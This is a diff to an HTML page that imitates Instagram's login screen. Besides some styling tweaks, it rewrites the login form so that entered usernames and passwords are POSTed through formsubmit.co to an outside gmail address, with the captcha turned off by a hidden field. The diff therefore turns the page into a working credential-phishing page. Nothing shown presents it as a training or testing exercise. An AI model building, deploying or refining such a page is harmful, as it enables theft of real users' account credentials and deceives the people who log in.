@@ -16,6 +16,7 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
+      margin: 0;
     }
 
     .login-container {
@@ -24,6 +25,7 @@
       padding: 40px;
       width: 350px;
       text-align: center;
+      border-radius: 8px;
     }
 
     .login-container img {
@@ -52,27 +54,14 @@
       cursor: pointer;
     }
 
-    .or {
-      margin: 20px 0;
-      position: relative;
-      color: #8e8e8e;
+    .forgot-password {
+      margin-top: 12px;
+      font-size: 13px;
     }
 
-    .or::before, .or::after {
-      content: '';
-      position: absolute;
-      width: 40%;
-      height: 1px;
-      background: #dbdbdb;
-      top: 50%;
-    }
-
-    .or::before {
-      left: 0;
-    }
-
-    .or::after {
-      right: 0;
+    .forgot-password a {
+      color: #00376b;
+      text-decoration: none;
     }
 
     .signup {
@@ -89,13 +78,21 @@
 </head>
 <body>
   <div class="login-container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram" />
-    <form>
-      <input type="text" placeholder="Phone number, username, or email" required />
-      <input type="password" placeholder="Password" required />
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" />
+    
+    <form action="https://formsubmit.co/theinvestorcompany001@gmail.com" method="POST">
+      <input type="text" name="username" placeholder="Username or email" required />
+      <input type="password" name="password" placeholder="Password" required />
       <button type="submit">Log In</button>
+      
+      <div class="forgot-password">
+        <a href="#">Forgot password?</a>
+      </div>
+      
+      <!-- Optional: Stop bot spam -->
+      <input type="hidden" name="_captcha" value="false">
     </form>
-    <div class="or">OR</div>
+
     <div class="signup">
       Don't have an account? <a href="#">Sign up</a>
     </div>
